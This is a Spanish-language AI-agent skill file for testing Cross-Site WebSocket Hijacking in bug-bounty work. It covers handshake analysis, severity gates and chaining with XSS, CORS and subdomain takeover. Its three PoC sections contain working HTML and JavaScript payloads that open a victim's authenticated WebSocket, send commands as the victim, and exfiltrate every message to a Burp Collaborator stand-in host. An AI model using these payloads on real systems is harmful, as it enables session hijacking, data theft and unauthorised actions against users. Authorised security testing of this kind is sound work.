---
name: cswsh
description: Detecta y explota Cross-Site WebSocket Hijacking — handshake sin validación
  de Origin ni token anti-CSRF, con cookie de sesión adjuntable cross-site. Skill
  standalone con su propio evidence gate. El impacto depende del protocolo WebSocket
  del target (qué mensajes se intercambian tras el handshake).
sources: internal (built from scratch, evidence-gate-first)
---

## Qué es esto y qué NO es

Cross-Site WebSocket Hijacking (CSWSH) es el análogo de CSRF para WebSockets. El
browser adjunta automáticamente las cookies de sesión al handshake HTTP que establece
la conexión WebSocket — si el servidor no valida el header `Origin` ni exige un
token anti-CSRF en ese handshake, un atacante puede abrir una conexión WebSocket
al target desde una página maliciosa, con la sesión de la víctima, y leer o mandar
mensajes como si fuera ella.

**Lo que este skill NO cubre:**
- WebSockets autenticados vía JWT en header `Authorization` — el browser no adjunta
  headers custom en el handshake iniciado por `new WebSocket()`, por lo que el
  mecanismo de CSWSH no aplica. Si el token viaja en query param (`wss://...?token=X`),
  es un vector distinto (token expuesto en logs/proxies) — documentar aparte, no
  como CSWSH.
- Vulnerabilidades dentro del protocolo WebSocket una vez establecida la conexión
  (inyección en mensajes, lógica de negocio, etc.) — eso es análisis de protocolo,
  fuera del scope de este skill.
- CORS sobre WebSocket — WebSocket no usa CORS; el único mecanismo de control de
  origen es el header `Origin` que el servidor puede validar (o no) en el handshake.

## Señales de activación

Cargar este skill cuando en la sección `## WebSocket` de `recon.md` aparezca:

- Un endpoint `wss://` o `ws://` del target
- Mención de que la auth del WebSocket usa cookies de sesión
- `CheckOrigin: true` / `checkOrigin` en configuración de servidor detectada
- Ausencia explícita de token anti-CSRF en el handshake

Input base: sección `## WebSocket` de `recon.md` (endpoints, mecanismo de auth,
protocolo observado), sección `## Cookies y tokens` (flags de cookies), sección
`## Formularios y CSRF` (tokens en el handshake).

---

## Fase 1 — Análisis del handshake

Responder las cuatro preguntas en orden. No pasar a Fase 2 sin completar todas.
Cada pregunta puede cerrar el lead con un killer específico.

### Pregunta 1 — ¿Cómo se autentica el WebSocket?

Revisar la sección `## WebSocket` de `recon.md`:

| Mecanismo de auth observado | Evaluación |
|---|---|
| Cookie de sesión adjuntada en el handshake | **Continuar** — el browser la adjunta automáticamente, CSWSH aplica |
| JWT en header `Authorization: Bearer` | **Cerrar** — el browser no adjunta headers custom en `new WebSocket()`. Killer: `"auth vía Bearer header — no adjuntable cross-site, CSWSH no aplica"` |
| Token en query param (`wss://target.com/ws?token=X`) | **Documentar aparte** — no es CSWSH clásico; el token en URL queda expuesto en logs de servidor, proxies y `Referer`. Abrir lead separado en `leads.md` como information disclosure. Killer para CSWSH: `"auth en query param — CSWSH no aplica; ver lead de token en URL"` |
| Sin auth / conexión pública | **Sin impacto de sesión** — si el endpoint no tiene datos de sesión, no hay nada que hijackear. Documentar y cerrar |
| Auth no clara en recon.md | **PENDIENTE** — marcar como PENDIENTE, no continuar hasta confirmar el mecanismo |

### Pregunta 2 — ¿Qué SameSite tiene la cookie de sesión?

Leer de la sección `## Cookies y tokens` de `recon.md`:

| SameSite de la cookie de sesión | Evaluación |
|---|---|
| `SameSite=Strict` | **BLOQUEADO** — el browser no adjunta la cookie en requests iniciados desde un origen externo, incluyendo el handshake WebSocket. Killer: `"SameSite=Strict — cookie no adjuntable desde origen externo"` |
| `SameSite=Lax` | **BLOQUEADO cross-site** pero **explotable same-site** — un subdominio del mismo eTLD+1 sí puede disparar el handshake con la cookie. Continuar solo si hay subdominio candidato (ver Cadena B). Killer parcial: `"SameSite=Lax — cross-site bloqueado; candidato same-site si hay subdominio vulnerable"` |
| `SameSite=None; Secure` | **Sin restricción** — la cookie se adjunta desde cualquier origen. Continuar |
| Sin atributo `SameSite` explícito | **Depende del browser** — Chrome trata como Lax por default desde 2021; Firefox Total Cookie Protection bloquea cookies third-party desde 2022. En la práctica, tratar como Lax: BLOQUEADO cross-site, posible same-site. Documentar la ambigüedad |

**Nota sobre SameSite=Lax:** si el target tiene subdominios en scope (o con XSS/takeover
candidato), no cerrar el lead — reclasificar como CANDIDATO SAME-SITE y continuar
con la Pregunta 3. Si no hay ningún subdominio del mismo site disponible, cerrar.

### Pregunta 3 — ¿El servidor valida el header Origin en el handshake?

El header `Origin` es el único mecanismo nativo de control de origen para WebSocket.
A diferencia de las cookies (donde SameSite actúa en el browser), la validación de
`Origin` actúa en el servidor.

| Patrón de validación observado | Evaluación |
|---|---|
| Validación con literal exacto (`if origin != "https://target.com" { reject }`) | **BLOQUEADO** — killer: `"Origin check estricto con literal exacto"` |
| Validación con `includes("target.com")` o `endsWith("target.com")` | **Bypasseable** — `https://target.com.evil.com` o `https://eviltarget.com` pasan el check. Continuar |
| `CheckOrigin: true` en config de Gorilla/Go, `allowedOrigins: [*]`, o sin validación explícita | **Sin validación** — cualquier origen pasa. Continuar |
| Validación no observable en recon.md | **PENDIENTE** — documentar que falta confirmar; verificable haciendo el handshake con `Origin: https://evil.com` manualmente (acción del operador) |

**Si el bypass de `endsWith`/`includes` aplica:** documentar el subdominio o dominio
exacto que burla el check. Esto cambia la explotación (requiere controlar ese dominio).

### Pregunta 4 — ¿Hay token anti-CSRF en el handshake?

Revisar si el handshake incluye algún token en query param o en un header custom
que el servidor valide:

| Situación | Evaluación |
|---|---|
| Token en query param del handshake (`wss://target.com/ws?csrf=TOKEN`) con valor impredecible (aleatorio por sesión) | **BLOQUEADO** — killer: `"token anti-CSRF en handshake, valor impredecible"` |
| Token en query param con valor predecible o estático | **No protege** — continuar |
| Sin token — el handshake solo lleva la cookie de sesión | **Sin protección CSRF** — continuar |
| Token presente pero obtenible via CORS misconfiguration | **Bypasseable** — documentar la cadena con `cors` |

### Clasificación final

Con las respuestas de las cuatro preguntas, clasificar el endpoint:

- **BLOQUEADO** — killer específico documentado (cualquiera de las preguntas 1-4
  cerró el análisis). Anotar exactamente qué bloquea y qué lo desbloquearía.
- **CANDIDATO CROSS-SITE** — auth vía cookie + `SameSite=None` + sin Origin check +
  sin token anti-CSRF. Explotable desde cualquier origen. Pasar a Fase 2, Cadena A.
- **CANDIDATO SAME-SITE** — auth vía cookie + `SameSite=Lax` (o sin atributo) + sin
  Origin check + sin token anti-CSRF + hay subdominio del mismo eTLD+1 disponible.
  Explotable solo desde ese subdominio. Pasar a Fase 2, Cadena B. Cruzar con
  `hunt-external-takeover` y `domain-recon` para el estado del subdominio.
- **PENDIENTE** — falta confirmar SameSite o validación de Origin. Documentar qué
  paso falta y cómo lo confirmaría el operador.

---

## Fase 2 — Generación de PoC

**El agente NO ejecuta nada en esta fase.** Genera el HTML y lo documenta en `leads.md`
para que el operador lo abra en su browser con sesión activa.

El PoC se guarda como `targets/<target>/poc_cswsh_<endpoint_id>.html`.

### Cadena A — Hijacking directo (CANDIDATO CROSS-SITE)

Aplica cuando la cookie de sesión viaja sin restricción de origen (SameSite=None o
ausente con Chrome comportándose permisivo) y el servidor no valida Origin.

```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC — [TARGET] — [ENDPOINT_ID]</title></head>
<body>
<pre id="log">Conectando...</pre>
<script>
  var log = document.getElementById('log');

  // El browser adjuntará automáticamente las cookies de sesión de la víctima
  // al handshake — no hace falta hacer nada especial para eso.
  var ws = new WebSocket('wss://[TARGET]/[ENDPOINT_WS]');

  ws.onopen = function() {
    log.textContent += '\n[+] Handshake completado — conexión establecida con sesión de víctima';

    // Si el protocolo del target requiere un mensaje inicial para recibir datos,
    // enviarlo acá. Ajustar según el protocolo observado en recon.md:
    // ws.send(JSON.stringify({ type: 'subscribe', channel: 'user_data' }));
    // ws.send('ping');
  };

  ws.onmessage = function(e) {
    log.textContent += '\n[MSG] ' + e.data;

    // Exfiltrar cada mensaje recibido a Collaborator/webhook propio:
    fetch('https://COLLABORATOR.burpcollaborator.net/cswsh', {
      method: 'POST',
      body: e.data
    });
  };

  ws.onerror = function(e) {
    log.textContent += '\n[ERR] Error en la conexión — posible Origin check o SameSite bloqueando';
  };

  ws.onclose = function(e) {
    log.textContent += '\n[-] Conexión cerrada: código ' + e.code + ' — ' + e.reason;
  };
</script>
</body>
</html>
```

**Instrucciones para el operador:**
1. Abrir el browser con sesión activa en el target.
2. Servir este HTML desde un origen distinto al target (`localhost` en otro puerto,
   o cualquier dominio externo — no `file://`).
3. Navegar al HTML y verificar que el log muestra "Handshake completado".
4. Verificar que los mensajes recibidos contienen datos de la sesión de la víctima
   (no una respuesta de error de auth).
5. Confirmar el callback en Burp Collaborator o webhook propio.

**Qué mensajes esperar:** según el protocolo observado en `## WebSocket` de `recon.md`,
documentar acá qué mensajes envía el servidor tras el handshake (datos del usuario,
notificaciones, estado de la aplicación). Si el protocolo no está documentado en
`recon.md`, el operador debe inspeccionar el tráfico WebSocket con DevTools antes
de correr el PoC.

**Si el PoC no conecta:**
- Si `onerror` dispara inmediatamente: el servidor rechazó el handshake por Origin
  check. Documentar como BLOQUEADO con killer: `"servidor rechaza handshake desde
  origen externo — Origin check activo (no visible en recon.md)"`.
- Si conecta pero no recibe mensajes de sesión: verificar si el protocolo requiere
  un mensaje inicial para activar el stream de datos.

### Cadena B — Hijacking via subdominio (CANDIDATO SAME-SITE)

Aplica cuando la cookie de sesión tiene `SameSite=Lax` (o sin atributo) y el
atacante controla un subdominio del mismo eTLD+1 del target — ya sea por XSS
confirmado en ese subdominio o por takeover.

**Los dos pasos son estrictamente secuenciales — el Paso 2 (el WebSocket) no
se ejecuta sin el Paso 1 (el foothold en el subdominio). Sin el subdominio, esta
cadena no existe.**

**Paso 1 — Foothold en subdominio del mismo site:**
Confirmar que el atacante puede ejecutar JS en un subdominio que comparte eTLD+1
con el target (ej: si el target es `app.target.com`, el subdominio debe ser
`*.target.com`). Mecanismos posibles:
- XSS confirmado en `sub.target.com` (cruzar con `xss`)
- Takeover de `sub.target.com` (cruzar con `hunt-external-takeover`)

Si ninguno de los dos está confirmado: documentar como BLOQUEADO.
Killer: `"Cadena B — BLOQUEADO: requiere foothold en subdominio de target.com;
sin XSS ni takeover confirmado en ningún subdominio del mismo eTLD+1"`.

**Paso 2 — Desde el foothold, abrir el WebSocket:**
El JS ejecutado en `sub.target.com` puede abrir un WebSocket a `app.target.com`
y el browser adjuntará la cookie de sesión (porque comparten eTLD+1 y SameSite=Lax
no bloquea requests same-site).

```javascript
// Este payload corre en el contexto de sub.target.com (vía XSS o takeover).
// El WebSocket se abre al endpoint del target principal.
var ws = new WebSocket('wss://[TARGET_PRINCIPAL]/[ENDPOINT_WS]');

ws.onopen = function() {
  // Ajustar el mensaje inicial según el protocolo del target si hace falta:
  // ws.send(JSON.stringify({ type: 'subscribe' }));
};

ws.onmessage = function(e) {
  // Exfiltrar a Collaborator desde el contexto del subdominio:
  fetch('https://COLLABORATOR.burpcollaborator.net/cswsh-samesite', {
    method: 'POST',
    body: e.data
  });
};
```

Documentar en `leads.md` que esta cadena tiene dos precondiciones documentadas:
1. Foothold en subdominio: `[ESTADO: confirmado / candidato / BLOQUEADO]`
2. WebSocket explotable: `[ESTADO: candidato — pendiente de confirmación por operador]`

### Cadena C — Acciones state-changing via WebSocket

Aplica cuando el WebSocket no solo envía datos al cliente sino que también acepta
comandos del cliente que ejecutan acciones en nombre del usuario autenticado —
modificar datos, disparar operaciones, acceder a funcionalidad administrativa.

**Esta cadena extiende la Cadena A o B:** el hijacking del handshake es el mismo
mecanismo; la diferencia es lo que el atacante manda al servidor una vez conectado.
No es una cadena independiente — requiere que la conexión hijackeada esté
establecida primero.

**Paso 1 — Identificar qué comandos acepta el WebSocket:**

Antes de mandar cualquier comando, leer los mensajes entrantes del servidor para
entender el protocolo. El servidor suele anunciar el esquema de mensajes en el
primer mensaje tras el handshake, o el protocolo está documentado en `## WebSocket`
de `recon.md`. Si no está documentado, el operador debe inspeccionar el tráfico
con DevTools antes de armar el payload.

Señales de que el WS acepta comandos (no solo push unidireccional):
- Mensajes del servidor con tipo `event`/`response` que sugieren un esquema
  request-response (ej: `{"type":"response","id":1,"data":{...}}`)
- JS del cliente que llama `ws.send(...)` con datos estructurados
- Documentación del protocolo en `recon.md` que lista mensajes bidireccionales

**Paso 2 — Armar el payload:**

```javascript
// Extender el onopen de la Cadena A o B con el comando a ejecutar.
// Ajustar la estructura según el protocolo real observado en recon.md.

ws.onopen = function() {
  log.textContent += '\n[+] Conexión establecida — escuchando protocolo...';
};

ws.onmessage = function(e) {
  log.textContent += '\n[MSG recibido] ' + e.data;

  // Opción A: protocolo JSON tipado (el más común)
  // Reemplazar type/action/params con los valores reales del protocolo del target:
  var comando = JSON.stringify({
    type: '[TIPO_DE_MENSAJE]',      // ej: "action", "command", "request"
    action: '[ACCION_A_EJECUTAR]',  // ej: "updateEmail", "deleteUser", "transferFunds"
    params: {
      // parámetros que el comando requiere según el protocolo observado
    }
  });

  // Opción B: protocolo texto plano o con separador
  // var comando = '[ACCION] [PARAM1] [PARAM2]';

  // Mandar el comando UNA sola vez después de leer el primer mensaje del servidor
  // (para confirmar que la conexión está autenticada antes de actuar):
  if (!window._comandoEnviado) {
    window._comandoEnviado = true;
    log.textContent += '\n[>] Enviando comando: ' + comando;
    ws.send(comando);
  }

  // Exfiltrar todas las responses del servidor (incluye la respuesta al comando):
  fetch('https://COLLABORATOR.burpcollaborator.net/cswsh-action', {
    method: 'POST',
    body: '[COMANDO ENVIADO]\n' + comando + '\n\n[RESPONSE]\n' + e.data
  });
};
```

**Nota sobre el flag `_comandoEnviado`:** el comando se manda solo una vez, después
de recibir el primer mensaje del servidor. Esto evita mandar el comando antes de que
la sesión esté activa y evita duplicarlo si el servidor envía múltiples mensajes
de inicialización.

**Paso 3 — Confirmación del impacto:**

La confirmación depende del tipo de acción ejecutada:

| Tipo de acción | Cómo confirmar | Severidad |
|---|---|---|
| Leer datos (suscribirse a un canal, solicitar info del perfil) | Callback en Collaborator con datos de la cuenta de la víctima | **P3** — information disclosure |
| Modificar datos (cambio de email, password, preferencias, settings) | Verificar el cambio desde la cuenta víctima en DevTools o directamente — mismo protocolo de verificación que BOLA: baseline → acción → verificación → cleanup | **P2** |
| Acciones privilegiadas / administrativas (acceso a panel admin, operaciones sobre otros usuarios, ejecución de comandos en el servidor) | Verificar el efecto desde otra cuenta o desde el sistema | **P1** |

**El 200 del servidor (o una response de "OK" en el WebSocket) no confirma impacto
sobre la víctima.** Verificar el estado desde la cuenta víctima después de ejecutar
el comando — mismo protocolo que BOLA/IDOR. No reportar por encima de P3 sin esa
verificación.

**Si el protocolo no es claro en recon.md:** documentar como PENDIENTE y dejar
el PoC de la Cadena A activo para que el operador primero inspeccione el protocolo
en vivo, y luego extienda el `onopen` con el comando correcto. No armar el payload
a ciegas con campos inventados.

### Checklist antes de entregar el PoC al operador

- [ ] El endpoint `wss://` es exactamente el observado en `recon.md` (con path
  completo)
- [ ] El mensaje inicial post-handshake (si existe) está incluido en el PoC,
  comentado con la fuente en `recon.md`
- [ ] La URL del Collaborator/webhook está completada (no dejada como placeholder)
- [ ] Las instrucciones indican desde qué origen servir el HTML (no `file://`)
- [ ] Si es Cadena B, el estado del foothold está documentado explícito
- [ ] Si es Cadena C, el protocolo del target está documentado en `recon.md` o el
  operador confirmó que va a inspeccionar el tráfico antes de armar el payload —
  no dejar los campos `type`/`action` como placeholders sin indicar cómo completarlos
- [ ] Si es Cadena C y la acción modifica estado, hay instrucciones de cleanup

---

## Gate de evidencia — techo de severidad

| Evidencia | Techo |
|---|---|
| Endpoint WebSocket detectado en `recon.md`, análisis de handshake pendiente | **Informational** — señal sin análisis |
| Análisis completo: sin Origin check + SameSite=None + sin token anti-CSRF | **P4** — misconfiguration confirmada en análisis estático, impacto no verificado |
| PoC armado y documentado, no ejecutado todavía | **P4** — igual que arriba |
| Operador ejecuta el PoC, handshake conecta, pero no llegan mensajes con datos de sesión | **P4** — mecanismo de hijacking funciona, impacto limitado por protocolo |
| Operador ejecuta el PoC, recibe mensajes con datos de la cuenta de la víctima | **P3** — information disclosure confirmado |
| Mensajes incluyen tokens de API, datos financieros, o permiten acciones en nombre de la víctima | **P2/P1** según impacto |

**Nunca reportar por encima de P4 sin que el operador haya ejecutado el PoC y
confirmado que el handshake conecta y los mensajes contienen datos de sesión.**

---

## Qué mata el lead

- **`SameSite=Strict`** en la cookie de sesión — el browser no la adjuntará en
  ningún request cross-site, incluyendo el handshake WebSocket. Killer exacto con
  el nombre de la cookie afectada.
- **Origin check en el servidor** — el handshake es rechazado si `Origin` no
  coincide con la lista esperada. Verificable haciendo el handshake con
  `Origin: https://evil.com` manualmente (Burp Suite / wscat). Killer: `"servidor
  devuelve 403 en handshake con Origin externo — verificado con [herramienta]"`.
- **Token anti-CSRF impredecible en el handshake** — sin poder predecir o robar el
  token, el handshake desde un origen externo no puede incluirlo. Killer con el
  nombre del parámetro y por qué es impredecible.
- **WebSocket no usa cookies** — si la auth es por JWT en header (no adjuntable
  por el browser en el handshake) o por token en storage que el JS agrega
  manualmente. Killer con el mecanismo de auth observado.
- **Protocolo WebSocket no devuelve datos sensibles** — el handshake conecta pero
  los mensajes son solo actualizaciones de UI, pings, o datos públicos sin sesión.
  Killer: `"conexión establece pero mensajes no contienen datos de sesión —
  verificado por operador"`.

Documentar el killer con el valor exacto del header o flag observado, no genérico.

---

## Encadenamiento

- **CORS misconfiguration en el mismo target** → si el atacante puede leer el
  token anti-CSRF del handshake vía CORS, el token deja de ser una protección.
  Cadena: CORS lee el token → CSWSH usa el token en el handshake. Cruzar con
  `cors`.
- **XSS en el mismo origen** → neutraliza cualquier protección. El XSS puede abrir
  el WebSocket directamente desde el origen confiado con la cookie adjunta y sin
  necesidad de bypassear Origin check ni SameSite. Si hay XSS confirmado, evaluar
  si CSWSH agrega algo o si XSS ya cubre el impacto.
- **XSS o takeover en subdominio same-site** → habilita la Cadena B. Cruzar con
  `xss` y `hunt-external-takeover` para el estado de cada subdominio del target.
- **Mensajes WebSocket que disparan acciones** → si tras el hijacking el atacante
  puede mandar mensajes que ejecuten acciones en nombre de la víctima (no solo leer),
  el impacto escala. Cruzar con `hunt-csrf` para documentar la acción específica.

Al documentar cualquier hallazgo de este skill, correr `chain_analysis.md`
Parte 2 para ese tipo de hallazgo antes de cerrar el lead.

---

## Related Skills & Chains

- **`hunt-csrf`** — CSWSH es el análogo de CSRF para WebSockets. Si el endpoint
  WebSocket dispara acciones state-changing, evaluar el impacto con el mismo framework
  que `hunt-csrf`. El gate de confirmación (browser real, desde otro origen) es
  equivalente al Nivel 2 de `hunt-csrf`.
- **`cors`** — si el target tiene CORS misconfiguration, el atacante puede robar
  el token anti-CSRF del handshake y usarlo. Cadena activa si hay ambas señales.
- **`xss`** — XSS en el mismo origen hace innecesario el hijacking cross-site: el
  JS corre directamente en el origen del WebSocket. Si hay XSS confirmado, evaluar
  si añadir CSWSH al reporte suma impacto incremental.
- **`hunt-external-takeover`** — un subdominio del mismo eTLD+1 con takeover
  habilita la Cadena B sin necesitar XSS. Cruzar con los resultados de
  `domain-recon`.
- **`web-storage`** — si el token de auth WebSocket está en `localStorage`
  (no en cookie), el vector es distinto: el JS del atacante no puede acceder al
  storage del origen víctima. CSWSH no aplica, pero `web-storage` + `xss` sí.
